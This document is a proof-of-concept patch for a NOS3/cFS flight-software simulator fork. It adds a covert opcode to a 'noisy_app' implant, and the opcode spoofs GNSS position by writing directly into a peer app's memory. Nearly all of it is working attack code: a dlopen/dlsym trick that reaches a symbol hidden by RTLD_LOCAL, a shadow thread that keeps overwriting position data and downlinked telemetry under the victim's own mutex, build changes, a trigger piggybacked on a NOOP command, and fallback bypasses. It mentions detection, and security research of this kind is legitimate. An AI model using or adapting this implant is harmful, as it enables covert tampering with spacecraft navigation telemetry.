# Linux NOS-Engine implementation of the GNSS direct-memory-overwrite PoC

This is the complete code for reproducing the GNSS cross-app memory overwrite on the
**Linux / NOS-Engine** cFS target used by this fork (cFE 6.7.99, amd64). The portable
mechanism analysis is in `docs/security/gnss-mem-overwrite-analysis.md`; this document
is the concrete patch that arms it.

The capability rests on a single architectural fact: all cFS apps are pthreads in ONE
process (`os-impl-tasks.c` -> `pthread_create`), so they share one address space with no
inter-thread memory protection. A pointer obtained for one app's globals dereferences
into that app's memory directly. The only platform-specific wrinkle is *how* the implant
obtains the victim's address.

On this Linux target the POSIX OSAL loader honors `OS_MODULE_FLAG_LOCAL_SYMBOLS` and
loads each app `.so` with `RTLD_LOCAL` (`os-impl-posix-dl-loader.c`), so the victim's
`GENERIC_GNSS_AppData` symbol is not in the global scope and a plain `extern` reference
fails to resolve at load. The implant therefore obtains the victim's address a different
way: `dlopen("generic_gnss.so", RTLD_NOLOAD)` returns a handle to the already-resident
module, and `dlsym()` on that handle returns the symbol's address even though it was
loaded `RTLD_LOCAL` (`RTLD_LOCAL` only hides a symbol from *global*-scope resolution, not
from `dlsym` on the module's own handle). Once we have the pointer, the write into
`LastBusLat/LastBusLon` is unprotected.

Everything else (the piggyback trigger, the shadow-loop timing, the ELK truth-vs-bus
detection) is the same as described in the analysis doc.

---

## File 1: `nos3/fsw/apps/noisy_app/fsw/src/noisy_app.c`

The `noisy_app` implant already carries the EPS / SB / IMU opcodes. Apply these five
insertions to add the GNSS overwrite opcode (`0x0C`).

### 1a. Includes - add near the other component includes (after `generic_eps_msgids.h`)

```c
#include <dlfcn.h>            /* dlopen/dlsym - runtime symbol resolution            */

/*
 * OPCODE_GNSS_SPOOF target: the victim GNSS app's own global state.
 *
 * Unlike every SB-based scenario, this one does NOT touch the Software Bus. cFS on
 * Linux runs all apps as pthreads in ONE process (os-impl-tasks.c), so they share a
 * single address space with no inter-thread MMU protection. The POSIX loader honors
 * RTLD_LOCAL for apps (os-impl-posix-dl-loader.c), so we cannot `extern`-reference the
 * GNSS app's global directly; instead we resolve it at runtime with
 * dlopen(RTLD_NOLOAD)+dlsym (see NOISY_ResolveGnssAppData). We then overwrite the
 * source-of-truth cache (LastBusLat/Lon/Alt) the GNSS HK report samples each cycle, so
 * the spoofed position propagates into the downlinked packet.
 *
 * We include the real header for exact field offsets; the unused `extern` declaration
 * it carries creates no link dependency because we never name the symbol directly (we
 * go through dlsym).
 */
#include "generic_gnss_app.h" /* GENERIC_GNSS_AppData_t layout (resolved via dlsym)   */
```

### 1b. Opcode define - add to the covert-opcode block (after `OPCODE_IMU_BIAS`)

```c
#define OPCODE_GNSS_SPOOF   0x0C /* PERSISTENT: overwrite peer GNSS app memory  */
```

### 1c. Scenario tuning + EVS event id - add near the other `#define` tuning blocks

```c
/* ---- OPCODE_GNSS_SPOOF: direct cross-app memory overwrite ---------------- *
 * Spoof coordinates written into the victim GNSS app's cached source-of-truth.
 * Null Island (0,0) is an obviously-wrong, recognizable GPS-spoof signature;
 * it also drops the spacecraft out of the GNSS app's Denmark geofence box. */
#define GNSS_SPOOF_LAT   0.0   /* deg WGS84 */
#define GNSS_SPOOF_LON   0.0   /* deg WGS84 */
#define GNSS_SPOOF_ALT   0.0   /* m WGS84 ellipsoid */
/* The GNSS BusRx child task rewrites LastBus* from the sim line every tick, so a single
 * write is clobbered. Shadow it faster than the sim refresh so the HK report
 * predominantly samples our value. Expect some oscillation between spoofed and genuine
 * samples; that residual is itself a detection artifact. */
#define GNSS_SHADOW_PERIOD_MS 100
/* Victim module file name as loaded by CFE_ES on the Linux target (see
 * fsw/build/exe/cpu1/cf/). dlopen resolves it from the cFS module load path. */
#define GNSS_MODULE_SO   "generic_gnss.so"
```

Add this EVS id alongside the others (`NOISY_EVT_POOLLOCK` etc.):

```c
#define NOISY_EVT_GNSS_SPOOF 8
```

### 1d. State + the resolver/shadow/start functions - add before `NOISY_APP_RunScenario`

Add the two state flags next to `NOISY_OverrideOn`:

```c
static bool NOISY_GnssSpoofOn  = false; /* OPCODE_GNSS_SPOOF engaged?     */
static bool NOISY_GnssTaskUp   = false; /* shadow child task created once */
```

Then the functions:

```c
/* Resolve the victim GNSS app's AppData global in our shared address space.
 *
 * The module is loaded RTLD_LOCAL, so its symbol is not in global scope and neither a
 * link-time `extern` nor OS_SymbolLookup (dlsym on RTLD_DEFAULT) can find it. But the
 * module IS resident: dlopen with RTLD_NOLOAD returns a handle to the already-loaded
 * library without reloading it, and dlsym on THAT handle returns the symbol address
 * despite RTLD_LOCAL. One process, no MMU boundary between threads -> the pointer is
 * directly writable. Result is cached; the single extra dlopen refcount is never
 * balanced because the module never unloads during the mission (intentional). */
static GENERIC_GNSS_AppData_t *NOISY_ResolveGnssAppData(void)
{
    static GENERIC_GNSS_AppData_t *cached = NULL;
    void                          *handle;

    if (cached != NULL)
    {
        return cached;
    }

    handle = dlopen(GNSS_MODULE_SO, RTLD_NOW | RTLD_NOLOAD);
    if (handle == NULL)
    {
        return NULL; /* GNSS app not loaded (yet) */
    }

    cached = (GENERIC_GNSS_AppData_t *)dlsym(handle, "GENERIC_GNSS_AppData");
    return cached;
}

/* OPCODE_GNSS_SPOOF shadow task - the direct cross-app memory overwrite.
 * Loops while NOISY_GnssSpoofOn, writing the spoof location into the peer GNSS app's
 * globals (source cache + in-flight HK packet) under the victim's own HkDataMutex.
 * Never on the Software Bus. */
static void NOISY_GnssShadowTask(void)
{
    GENERIC_GNSS_AppData_t *gnss = NOISY_ResolveGnssAppData();

    if (gnss == NULL)
    {
        CFE_EVS_SendEvent(NOISY_EVT_GNSS_SPOOF, CFE_EVS_EventType_ERROR,
                          "NOISY_APP: GNSS spoof could not resolve %s:GENERIC_GNSS_AppData.",
                          GNSS_MODULE_SO);
        NOISY_GnssSpoofOn = false;
        NOISY_GnssTaskUp  = false;
        return;
    }

    while (NOISY_GnssSpoofOn)
    {
        if (OS_MutSemTake(gnss->HkDataMutex) == OS_SUCCESS)
        {
            gnss->LastBusLat = GNSS_SPOOF_LAT;
            gnss->LastBusLon = GNSS_SPOOF_LON;
            gnss->LastBusAlt = GNSS_SPOOF_ALT;
            gnss->HkTelemetryPkt.DeviceHK.GnssLat = GNSS_SPOOF_LAT;
            gnss->HkTelemetryPkt.DeviceHK.GnssLon = GNSS_SPOOF_LON;
            OS_MutSemGive(gnss->HkDataMutex);
        }
        OS_TaskDelay(GNSS_SHADOW_PERIOD_MS);
    }
    NOISY_GnssTaskUp = false; /* task exits when spoof cleared; allow re-arm */
}

/* OPCODE_GNSS_SPOOF - engage the persistent GNSS position overwrite. */
static void NOISY_StartGnssSpoof(void)
{
    NOISY_GnssSpoofOn = true;

    if (!NOISY_GnssTaskUp)
    {
        CFE_ES_TaskId_t tid = CFE_ES_TASKID_UNDEFINED;
        if (CFE_ES_CreateChildTask(&tid, "NOISY_GNSS_SHADOW", NOISY_GnssShadowTask,
                                   CFE_ES_TASK_STACK_ALLOCATE, 8192, 120, 0) == CFE_SUCCESS)
        {
            NOISY_GnssTaskUp = true;
        }
        else
        {
            NOISY_GnssSpoofOn = false; /* could not arm */
            return;
        }
    }

    CFE_EVS_SendEvent(NOISY_EVT_GNSS_SPOOF, CFE_EVS_EventType_INFORMATION,
                      "NOISY_APP: GNSS position SPOOF ENGAGED via direct memory write "
                      "(lat=%.4f lon=%.4f). Send opcode 0x00 to clear.",
                      (double)GNSS_SPOOF_LAT, (double)GNSS_SPOOF_LON);
}
```

### 1e. Dispatch - add a case to `NOISY_APP_RunScenario`, and clear on DORMANT

Add the case (after `OPCODE_IMU_BIAS`):

```c
        case OPCODE_GNSS_SPOOF:
            /* Persistent: directly overwrite the peer GNSS app's cached position in
             * memory (no Software Bus). */
            NOISY_StartGnssSpoof();
            break;
```

In the existing `OPCODE_DORMANT` case, after the EPS-override clear, add:

```c
            if (NOISY_GnssSpoofOn)
            {
                NOISY_GnssSpoofOn = false;
                CFE_EVS_SendEvent(NOISY_EVT_GNSS_SPOOF, CFE_EVS_EventType_INFORMATION,
                                  "NOISY_APP: GNSS position SPOOF CLEARED.");
            }
```

---

## File 2: `nos3/fsw/apps/noisy_app/CMakeLists.txt`

Append after the existing component include block:

```cmake
# OPCODE_GNSS_SPOOF: the victim GNSS app's real headers (for exact struct offsets).
# generic_gnss_app.h pulls in hwlib.h plus the GNSS msg/msgid/platform headers, so add
# the same include roots generic_gnss's own CMakeLists uses.
target_include_directories(noisy_app PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}/../../../components/generic_gnss/fsw/cfs/src
    ${CMAKE_CURRENT_SOURCE_DIR}/../../../components/generic_gnss/fsw/cfs/platform_inc
    ${CMAKE_CURRENT_SOURCE_DIR}/../../../components/generic_gnss/fsw/cfs/mission_inc
    ${hwlib_MISSION_DIR}/fsw/public_inc
)

# dlopen/dlsym for runtime symbol resolution. ${CMAKE_DL_LIBS} is "dl" on older glibc
# and empty on glibc >= 2.34 (where dl* live in libc) - portable either way.
target_link_libraries(noisy_app ${CMAKE_DL_LIBS})

# RTLD_NOLOAD is a GNU extension - it needs _GNU_SOURCE before <dlfcn.h>. Define it on
# the command line so include order in the source does not matter.
target_compile_definitions(noisy_app PRIVATE _GNU_SOURCE)
```

---

## File 3: `nos3/poc/piggyback_noisy/drive_poc.py`

Add a `gnss` mode that piggybacks opcode `0x0C` on the carrier NOOP, alongside the
existing `spoof` / `override` / `imu` / `flood` modes. The trailing opcode byte is the
only difference on the wire.

---

## Build / run / verify (Linux target)

```bash
cd nos3
make fsw            # default target is amd64-nos3 (Linux)
make launch
# confirm baseline: gnss_lat ~= gnss_truth_lat in Kibana (index nos3-telemetry-*)

python3 poc/piggyback_noisy/drive_poc.py <FSW_IP> <DEST_IP> gnss   # engage
#   -> downlinked gnss_lat / gnss_lon collapse to 0,0 while gnss_truth_lat/lon
#      stay on the real orbit track (truth-vs-bus divergence = the detection)
python3 poc/piggyback_noisy/drive_poc.py <FSW_IP> <DEST_IP> off    # clear
```

Detection is the cross-source divergence covered in
`docs/security/gnss-mem-overwrite-analysis.md`: under the spoof, the downlinked
`gnss_lat/lon` diverge from the sim's `gnss_truth_lat/lon`, which the in-process implant
cannot reach.

## If `dlopen("generic_gnss.so", RTLD_NOLOAD)` returns NULL

That only means the module file name or search path differs on your build. Fallbacks,
in order of preference:
1. Confirm the exact `.so` name in `fsw/build/exe/cpu1/cf/` and update `GNSS_MODULE_SO`.
2. Pass an absolute path to `dlopen` (e.g. the path CFE_ES logged at load).
3. Use CFE_ES to get the GNSS app's module id and call `OS_SymbolLookupInModule`
   (`osapi-module.h`) - it resolves against the specific module handle, same effect as
   the `dlsym`-by-handle technique.
4. If a build links cFS statically into a single `core-cpu1` binary (no per-app `.so`),
   then the symbol IS in the main executable's table: a plain `extern GENERIC_GNSS_AppData`
   resolves directly at link time, simpler than dlsym. Check whether
   `fsw/build/exe/cpu1/` has per-app `.so` files (dynamic) or one binary (static).
```
